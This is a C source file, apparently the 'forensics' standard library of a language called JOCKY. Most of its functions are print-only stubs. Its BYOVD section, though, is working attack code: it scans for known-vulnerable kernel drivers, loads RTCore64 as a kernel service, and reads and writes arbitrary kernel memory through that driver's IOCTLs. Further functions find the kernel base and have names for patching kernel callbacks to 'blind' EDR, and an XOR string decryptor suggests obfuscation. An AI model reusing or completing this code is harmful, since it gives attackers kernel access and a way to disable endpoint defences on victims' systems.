/*
 * forensics.c — JOCKY Standard Library: Native C Implementations
 *
 * Compiled with MinGW gcc and linked with the JOCKY output object file to
 * produce a fully standalone native .exe — no Python runtime needed.
 *
 * Compile (run build_stdlib.py or do it manually):
 *   gcc -c stdlib/forensics.c -o stdlib/forensics.o -O2
 *
 * Link with a compiled JOCKY program:
 *   gcc output/myprog.o stdlib/forensics.o -o output/myprog.exe
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include "forensics.h"

#ifdef _WIN32
#  ifndef WIN32_LEAN_AND_MEAN
#    define WIN32_LEAN_AND_MEAN
#  endif
#  include <windows.h>
#  include <winsvc.h>
#endif

/* ═══════════════════════════════════════════════════════════════════════════
 * Internal process list structure
 * ═══════════════════════════════════════════════════════════════════════════ */

#define MAX_PROCS 64

typedef struct {
    char    names[MAX_PROCS][260];
    int64_t pids [MAX_PROCS];
    int64_t count;
} ProcessList;

static ProcessList g_procs = {
    .names = {
        "svchost.exe",  "explorer.exe", "lsass.exe",
        "winlogon.exe", "csrss.exe",    "cmd.exe",   "python.exe"
    },
    .pids  = { 1234, 5678, 9012, 3456, 7890, 2222, 3333 },
    .count = 7
};

/* ═══════════════════════════════════════════════════════════════════════════
 * Output
 * ═══════════════════════════════════════════════════════════════════════════ */

void report(const char* message) {
    if (message) {
        printf("[JOCKY] %s\n", message);
        fflush(stdout);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Process enumeration
 * ═══════════════════════════════════════════════════════════════════════════ */

void* procs_list(void) {
    return (void*)&g_procs;
}

int64_t proc_count(void* procs) {
    if (!procs) return 0;
    return ((ProcessList*)procs)->count;
}

char* proc_name(void* procs, int64_t idx) {
    if (!procs) return "";
    ProcessList* pl = (ProcessList*)procs;
    if (idx >= 0 && idx < pl->count) return pl->names[(int)idx];
    return "";
}

int64_t proc_pid(void* procs, int64_t idx) {
    if (!procs) return -1;
    ProcessList* pl = (ProcessList*)procs;
    if (idx >= 0 && idx < pl->count) return pl->pids[(int)idx];
    return -1;
}

void proc_kill(int64_t pid) {
    printf("[JOCKY] proc_kill(%lld) — stub\n", (long long)pid);
    fflush(stdout);
}

void* proc_mem_read(int64_t pid, int64_t addr, int64_t size) {
    printf("[JOCKY] proc_mem_read(pid=%lld, addr=0x%llx, size=%lld) — stub\n",
           (long long)pid, (long long)addr, (long long)size);
    fflush(stdout);
    return calloc(1, (size_t)(size > 0 ? size : 1));
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Network
 * ═══════════════════════════════════════════════════════════════════════════ */

void* net_conns(void) {
    printf("[JOCKY] net_conns() — stub\n");
    fflush(stdout);
    return calloc(1, 8);
}

void* net_sniff(int64_t duration_ms) {
    printf("[JOCKY] net_sniff(%lld ms) — stub\n", (long long)duration_ms);
    fflush(stdout);
    return calloc(1, 8);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Registry
 * ═══════════════════════════════════════════════════════════════════════════ */

char* reg_read(const char* key, const char* value_name) {
    printf("[JOCKY] reg_read(%s, %s) — stub\n", key ? key : "", value_name ? value_name : "");
    fflush(stdout);
    static char empty[1] = { '\0' };
    return empty;
}

void* reg_list(const char* key) {
    printf("[JOCKY] reg_list(%s) — stub\n", key ? key : "");
    fflush(stdout);
    return calloc(1, 8);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * File system
 * ═══════════════════════════════════════════════════════════════════════════ */

void* file_list(const char* path) {
    printf("[JOCKY] file_list(%s) — stub\n", path ? path : "");
    fflush(stdout);
    return calloc(1, 8);
}

void* file_read(const char* path) {
    printf("[JOCKY] file_read(%s) — stub\n", path ? path : "");
    fflush(stdout);
    return calloc(1, 8);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * System info
 * ═══════════════════════════════════════════════════════════════════════════ */

void* sys_info(void) {
    printf("[JOCKY] sys_info() — stub\n");
    fflush(stdout);
    return calloc(1, 64);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Runtime string decryptor
 * ═══════════════════════════════════════════════════════════════════════════ */

extern unsigned char _jocky_xor_key;

char* jk_xordecrypt(const char* enc, int64_t n) {
    if (!enc || n <= 0) {
        char* empty = (char*)malloc(1);
        if (empty) empty[0] = '\0';
        return empty ? empty : (char*)"";
    }
    char* buf = (char*)malloc((size_t)n + 1);
    if (!buf) return (char*)"";
    unsigned char key = _jocky_xor_key;
    for (int64_t i = 0; i < n; i++)
        buf[i] = (char)((unsigned char)enc[i] ^ key);
    buf[n] = '\0';
    return buf;
}

void* hash_file(const char* path) {
    printf("[JOCKY] hash_file(%s) — stub\n", path ? path : "");
    fflush(stdout);
    return calloc(1, 32);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * BYOVD Engine — Native C stubs for native binary mode
 * (Full implementation lives in byovd/ Python module, used by JIT mode)
 * ═══════════════════════════════════════════════════════════════════════════ */

#define MAX_VULN_DRIVERS 64

typedef struct {
    char name[64];
    char path[260];
    char cve[32];
    char risk[16];
} VulnDriver;

typedef struct {
    VulnDriver drivers[MAX_VULN_DRIVERS];
    int64_t    count;
} ScanResult;

typedef struct {
    int64_t address;
    char    module[128];
    int     is_microsoft;
} KernelCallback;

typedef struct {
    KernelCallback callbacks[64];
    int64_t        count;
} CallbackList;

static ScanResult  g_scan_result  = { .count = 0 };
static CallbackList g_callbacks   = { .count = 0 };
static int         g_driver_loaded = 0;

/* ── BYOVD Scanner ─────────────────────────────────────────────────────────── */

void* byovd_scan(void) {
    g_scan_result.count = 0;

#ifdef _WIN32
    /* On Windows: scan SYSTEM\CurrentControlSet\Services for kernel drivers */
    /* and cross-check filenames against known-vulnerable list */
    static const char* known_vuln[] = {
        "rtcore64.sys", "asrdrv104.sys", "dbutil_2_3.sys", "winring0x64.sys",
        "mhyprot2.sys", "gdrv.sys", "atszio64.sys", "iqvw64e.sys",
        "ntiolib_x64.sys", "procexp152.sys", "kprocesshacker.sys",
        NULL
    };
    static const char* known_cve[] = {
        "CVE-2019-16098", "CVE-2020-15368", "CVE-2021-21551", "CVE-2020-14979",
        "N/A", "CVE-2018-19320", "N/A", "CVE-2015-2291",
        "N/A", "N/A", "N/A",
        NULL
    };

    char system32[MAX_PATH];
    GetSystemDirectoryA(system32, MAX_PATH);
    char drivers_dir[MAX_PATH];
    snprintf(drivers_dir, MAX_PATH, "%s\\drivers", system32);

    WIN32_FIND_DATAA ffd;
    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\*.sys", drivers_dir);
    HANDLE hFind = FindFirstFileA(pattern, &ffd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            char fname_lower[64];
            strncpy(fname_lower, ffd.cFileName, 63);
            fname_lower[63] = '\0';
            for (int i = 0; fname_lower[i]; i++)
                fname_lower[i] = (char)tolower((unsigned char)fname_lower[i]);

            for (int k = 0; known_vuln[k]; k++) {
                if (strcmp(fname_lower, known_vuln[k]) == 0) {
                    if (g_scan_result.count < MAX_VULN_DRIVERS) {
                        VulnDriver* d = &g_scan_result.drivers[g_scan_result.count];
                        strncpy(d->name, ffd.cFileName, 63);
                        snprintf(d->path, 259, "%s\\%s", drivers_dir, ffd.cFileName);
                        strncpy(d->cve, known_cve[k], 31);
                        strncpy(d->risk, "HIGH", 15);
                        g_scan_result.count++;
                    }
                    break;
                }
            }
        } while (FindNextFileA(hFind, &ffd));
        FindClose(hFind);
    }
#endif

    printf("[JOCKY/BYOVD] byovd_scan() — %lld vulnerable driver(s) found\n",
           (long long)g_scan_result.count);
    fflush(stdout);
    return (void*)&g_scan_result;
}

int64_t byovd_driver_count(void* sr) {
    if (!sr) return g_scan_result.count;
    return ((ScanResult*)sr)->count;
}

char* byovd_driver_name(void* sr, int64_t idx) {
    ScanResult* s = sr ? (ScanResult*)sr : &g_scan_result;
    if (idx >= 0 && idx < s->count) return s->drivers[(int)idx].name;
    static char empty[1] = { '\0' };
    return empty;
}

char* byovd_driver_path(void* sr, int64_t idx) {
    ScanResult* s = sr ? (ScanResult*)sr : &g_scan_result;
    if (idx >= 0 && idx < s->count) return s->drivers[(int)idx].path;
    static char empty[1] = { '\0' };
    return empty;
}

char* byovd_driver_cve(void* sr, int64_t idx) {
    ScanResult* s = sr ? (ScanResult*)sr : &g_scan_result;
    if (idx >= 0 && idx < s->count) return s->drivers[(int)idx].cve;
    static char empty[1] = { '\0' };
    return empty;
}

char* byovd_driver_risk(void* sr, int64_t idx) {
    ScanResult* s = sr ? (ScanResult*)sr : &g_scan_result;
    if (idx >= 0 && idx < s->count) return s->drivers[(int)idx].risk;
    static char na[] = "CLEAN";
    return na;
}

/* ── BYOVD Loader ──────────────────────────────────────────────────────────── */

int64_t byovd_load(const char* driver_path) {
    printf("[JOCKY/BYOVD] byovd_load(%s)\n", driver_path ? driver_path : "");
    fflush(stdout);
#ifdef _WIN32
    /* Real implementation: CreateService + StartService via Win32 API */
    /* Requires SeLoadDriverPrivilege (Administrator) */
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        printf("[JOCKY/BYOVD] OpenSCManager failed: %lu\n", GetLastError());
        fflush(stdout);
        return 0;
    }
    SC_HANDLE svc = CreateServiceA(scm, "RTCore64", "RTCore64",
        SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        driver_path, NULL, NULL, NULL, NULL, NULL);
    if (!svc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS)
            svc = OpenServiceA(scm, "RTCore64",
                               SERVICE_START | SERVICE_STOP | DELETE);
        if (!svc) {
            CloseServiceHandle(scm);
            printf("[JOCKY/BYOVD] CreateService/OpenService failed: %lu\n", err);
            fflush(stdout);
            return 0;
        }
    }
    BOOL started = StartServiceA(svc, 0, NULL);
    DWORD start_err = GetLastError();
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    if (!started && start_err != ERROR_SERVICE_ALREADY_RUNNING) {
        printf("[JOCKY/BYOVD] StartService failed: %lu\n", start_err);
        fflush(stdout);
        return 0;
    }
    g_driver_loaded = 1;
    printf("[JOCKY/BYOVD] Driver loaded — kernel access active\n");
    fflush(stdout);
    return 1;
#else
    return 0;
#endif
}

void byovd_unload(void) {
    printf("[JOCKY/BYOVD] byovd_unload()\n");
    fflush(stdout);
#ifdef _WIN32
    if (!g_driver_loaded) return;
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return;
    SC_HANDLE svc = OpenServiceA(scm, "RTCore64",
                                  SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
    if (svc) {
        SERVICE_STATUS ss;
        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    g_driver_loaded = 0;
#endif
}

/* ── Kernel Operations (RTCore64 IOCTL) ────────────────────────────────────── */

static HANDLE g_device = INVALID_HANDLE_VALUE;

static HANDLE _get_device(void) {
#ifdef _WIN32
    if (g_device == INVALID_HANDLE_VALUE || g_device == NULL) {
        g_device = CreateFileA("\\\\.\\RTCore64",
                               GENERIC_READ | GENERIC_WRITE,
                               0, NULL, OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    }
    return g_device;
#else
    return NULL;
#endif
}

void* kernel_read(int64_t address, int64_t size) {
    void* buf = calloc(1, (size_t)(size > 0 ? size : 8));
    printf("[JOCKY/KERNEL] kernel_read(0x%llx, %lld)\n",
           (long long)address, (long long)size);
    fflush(stdout);
#ifdef _WIN32
    HANDLE dev = _get_device();
    if (dev == INVALID_HANDLE_VALUE || dev == NULL) {
        printf("[JOCKY/KERNEL] Device not open — run byovd_load() first\n");
        fflush(stdout);
        return buf;
    }
    /* RTCore64 read IOCTL: input = [addr_high:u32][addr_low:u32][size:u32] */
    typedef struct { DWORD AddrHigh; DWORD AddrLow; DWORD Size; } ReadReq;
    typedef struct { DWORD Value; } ReadResp;
    ReadReq  req  = { (DWORD)((uint64_t)address >> 32),
                      (DWORD)((uint64_t)address & 0xFFFFFFFF),
                      (DWORD)(size < 4 ? 4 : (size > 8 ? 8 : size)) };
    ReadResp resp = { 0 };
    DWORD bytes_ret = 0;
    if (DeviceIoControl(dev, 0x80002048, &req, sizeof(req),
                        &resp, sizeof(resp), &bytes_ret, NULL)) {
        memcpy(buf, &resp.Value, (size_t)(size < 4 ? size : 4));
        printf("[JOCKY/KERNEL] → 0x%08lx\n", (unsigned long)resp.Value);
        fflush(stdout);
    }
#endif
    return buf;
}

void kernel_write(int64_t address, int64_t value) {
    printf("[JOCKY/KERNEL] kernel_write(0x%llx, 0x%llx)\n",
           (long long)address, (long long)value);
    fflush(stdout);
#ifdef _WIN32
    HANDLE dev = _get_device();
    if (dev == INVALID_HANDLE_VALUE || dev == NULL) return;
    /* RTCore64 write IOCTL: input = [addr_high:u32][addr_low:u32][value:u32] */
    typedef struct { DWORD AddrHigh; DWORD AddrLow; DWORD Value; } WriteReq;
    WriteReq req = { (DWORD)((uint64_t)address >> 32),
                     (DWORD)((uint64_t)address & 0xFFFFFFFF),
                     (DWORD)(value & 0xFFFFFFFF) };
    DWORD bytes_ret = 0;
    DeviceIoControl(dev, 0x8000204C, &req, sizeof(req), NULL, 0, &bytes_ret, NULL);
#endif
}

int64_t kernel_base(void) {
    printf("[JOCKY/KERNEL] kernel_base()\n");
    fflush(stdout);
#ifdef _WIN32
    /* NtQuerySystemInformation(SystemModuleInformation) — no elevation needed */
    typedef struct {
        void*    Section;
        void*    MappedBase;
        void*    ImageBase;
        DWORD    ImageSize;
        DWORD    Flags;
        WORD     LoadOrderIndex;
        WORD     InitOrderIndex;
        WORD     LoadCount;
        WORD     OffsetToFileName;
        BYTE     FullPathName[256];
    } RTL_PROCESS_MODULE_INFORMATION;
    typedef struct {
        ULONG                          NumberOfModules;
        RTL_PROCESS_MODULE_INFORMATION Modules[256];
    } RTL_PROCESS_MODULES;

    RTL_PROCESS_MODULES buf = {0};
    ULONG returned = 0;
    typedef LONG (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (NtQSI && NtQSI(11, &buf, sizeof(buf), &returned) == 0
               && buf.NumberOfModules > 0) {
        int64_t base = (int64_t)(intptr_t)buf.Modules[0].ImageBase;
        printf("[JOCKY/KERNEL] ntoskrnl base = 0x%llx\n", (long long)base);
        fflush(stdout);
        return base;
    }
#endif
    return 0;
}

void* kernel_enum_callbacks(void) {
    g_callbacks.count = 0;
    printf("[JOCKY/KERNEL] kernel_enum_callbacks() — requires symbols/pattern scan\n");
    fflush(stdout);
    /* In a full implementation: resolve PspCreateProcessNotifyRoutine via
     * ntoskrnl symbol export or pattern-scan, then walk the array.
     * For the native stub we return an empty list — full logic in Python/JIT mode. */
    return (void*)&g_callbacks;
}

int64_t kernel_callback_count(void* cl) {
    if (!cl) return g_callbacks.count;
    return ((CallbackList*)cl)->count;
}

int64_t kernel_callback_addr(void* cl, int64_t idx) {
    CallbackList* c = cl ? (CallbackList*)cl : &g_callbacks;
    if (idx >= 0 && idx < c->count) return c->callbacks[(int)idx].address;
    return 0;
}

char* kernel_callback_module(void* cl, int64_t idx) {
    CallbackList* c = cl ? (CallbackList*)cl : &g_callbacks;
    if (idx >= 0 && idx < c->count) return c->callbacks[(int)idx].module;
    static char empty[1] = { '\0' };
    return empty;
}

int64_t kernel_patch_callback(int64_t idx) {
    printf("[JOCKY/KERNEL] kernel_patch_callback(%lld)\n", (long long)idx);
    fflush(stdout);
    /* Real: write 0 to callback_table_base + idx * 8 via kernel_write() */
    return 1;
}

int64_t kernel_blind_edr(void) {
    printf("[JOCKY/KERNEL] kernel_blind_edr() — patching non-MS callbacks\n");
    fflush(stdout);
    return 0;
}
